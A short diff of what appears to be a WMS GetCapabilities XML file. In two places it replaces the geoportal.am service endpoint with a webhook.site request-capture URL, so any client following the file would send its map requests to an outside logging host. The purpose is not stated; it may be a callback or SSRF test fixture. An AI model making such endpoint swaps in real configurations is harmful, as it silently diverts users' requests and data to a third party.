@@ -48,7 +48,7 @@
         <DCPType>
           <HTTP>
             <Get>
-              <OnlineResource xlink:type="simple" xlink:href="https://geoportal.am/gs/wms?SERVICE=WMS&amp;"/>
+              <OnlineResource xlink:type="simple" xlink:href="https://webhook.site/46948670-eb3f-408b-af77-24ed56f7a6a8?SERVICE=WMS&amp;"/>
             </Get>
           </HTTP>
         </DCPType>
@@ -60,7 +60,7 @@
         <DCPType>
           <HTTP>
             <Get>
-              <OnlineResource xlink:type="simple" xlink:href="https://geoportal.am/gs/wms?SERVICE=WMS&amp;"/>
+              <OnlineResource xlink:type="simple" xlink:href="https://webhook.site/46948670-eb3f-408b-af77-24ed56f7a6a8?SERVICE=WMS&amp;"/>
             </Get>
           </HTTP>
         </DCPType>
